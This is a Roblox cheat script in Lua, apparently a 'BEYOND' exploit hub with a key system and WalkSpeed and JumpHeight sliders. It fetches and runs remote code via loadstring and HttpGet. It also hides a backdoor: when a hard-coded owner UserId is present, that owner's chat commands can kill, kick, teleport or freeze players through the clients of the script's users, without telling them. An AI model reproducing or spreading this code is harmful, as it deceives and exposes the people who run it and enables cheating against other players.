local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()

local playerservice = game:GetService("Players")
local runservice = game:GetService("RunService")

local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local root = character:WaitForChild("HumanoidRootPart")

local ownerid = 53466350

local function gamecheck()
    for _, players in next, game:GetService("Players"):GetPlayers() do
        if players.UserId == ownerid then
            return true
        end
    end
    return false
end

local function search(display)
    for _, player in ipairs(playerservice:GetPlayers()) do
        if string.lower(player.DisplayName) == string.lower(display) then
            return player
        end
    end
    return nil
end

local function commandcheck()
    if gamecheck() then
        local owner = playerservice:GetNameFromUserIdAsync(ownerid)
        local ownerplayer = playerservice:FindFirstChild(owner)
        local ownercharacter = ownerplayer.Character
        local ownerhumanoid = ownercharacter:FindFirstChildOfClass("Humanoid")
        local ownerroot = ownercharacter:FindFirstChild("HumanoidRootPart")

        ownerplayer.Chatted:Connect(function(message)

            local command = string.split(message, ":")

            if command[1] == "bring" and command[2] then
                local targetplayer = playerservice:FindFirstChild(command[2]) or search(command[2])
                if targetplayer then
                    local targetcharacter = targetplayer.Character
                    local targetroot = targetcharacter:FindFirstChild("HumanoidRootPart")
                    targetroot.CFrame = ownerroot.CFrame
                end
            elseif command[1] == "kill" and command[2] then
                local targetplayer = playerservice:FindFirstChild(command[2]) or search(command[2])
                if targetplayer then
                    local targetcharacter = targetplayer.Character
                    local targethumanoid = targetcharacter:FindFirstChildOfClass("Humanoid")
                    targethumanoid.Health = 0
                end
            elseif command[1] == "kick" and command[2] then
                local targetplayer = playerservice:FindFirstChild(command[2]) or search(command[2])
                if targetplayer then
                    targetplayer:Kick("You have been kicked by the owner.")
                end
            elseif command[1] == "freeze" and command[2] then
                local targetplayer = playerservice:FindFirstChild(command[2]) or search(command[2])
                if targetplayer then
                    local targetcharacter = targetplayer.Character
                    local targetroot = targetcharacter:FindFirstChild("HumanoidRootPart")
                    targetroot.Anchored = true
                end
            elseif command[1] == "unfreeze" and command[2] then
                local targetplayer = playerservice:FindFirstChild(command[2]) or search(command[2])
                if targetplayer then
                    local targetcharacter = targetplayer.Character
                    local targetroot = targetcharacter:FindFirstChild("HumanoidRootPart")
                    if targetroot.Anchored then
                        targetroot.Anchored = false
                    end
                end
            end
        end)
    end
end

task.spawn(function()
    while task.wait() do
        if gamecheck() then
            commandcheck()
        end
    end
end)


local Window = Rayfield:CreateWindow({
   Name = "BEYOND",
   LoadingTitle = "BEYOND // INTERPRISE",
   LoadingSubtitle = "BY MOON",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = "config"
   },
   KeySystem = true,
   KeySettings = {
      Title = "BEYOND",
      Subtitle = "Key System",
      Note = "KEY IN DISCORD",
      FileName = "BEYONDKEY",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = "BETAAAA!"
   }
})

local Main      = Window:CreateTab("Main", 4483362458)
local Visuals   = Window:CreateTab("Visuals", 4483362458)
local Character = Window:CreateTab("Character", 4483362458)
local Game      = Window:CreateTab("Game", 4483362458)

local Updates  = Main:CreateSection("Updates", false)
local News     = Main:CreateSection("News", false)
local Humanoid = Character:CreateSection("Humanoid", false)


local NewsInfo   = Main:CreateParagraph({Title = "Recent News", Content = "WE AIN GOT SHI TO SAY HERE RN"}, News)
local UpdateInfo = Main:CreateParagraph({Title = "Recent Update", Content = "WE AIN GOT SHI TO SAY HERE RN"}, Updates)

local WalkSpeed = Character:CreateSlider({
   Name = "WalkSpeed",
   Info = "Change WalkSpeed",
   Range = {16, 200},
   Increment = 1,
   Suffix = "SPEED",
   CurrentValue = 16,
   Flag = "SPEED",
   SectionParent = Humanoid,

   Callback = function(Value)
    humanoid.WalkSpeed = Value
   end,
})

local JumpPower = Character:CreateSlider({
   Name = "JumpHeight",
   Info = "Change JumpHeight",
   Range = {7, 200},
   Increment = 1,
   Suffix = "HEIGHT",
   CurrentValue = 7,
   Flag = "JUMPHEIGHT",
   SectionParent = Humanoid,
   
   Callback = function(Value)
    humanoid.JumpHeight = Value
   end,
})
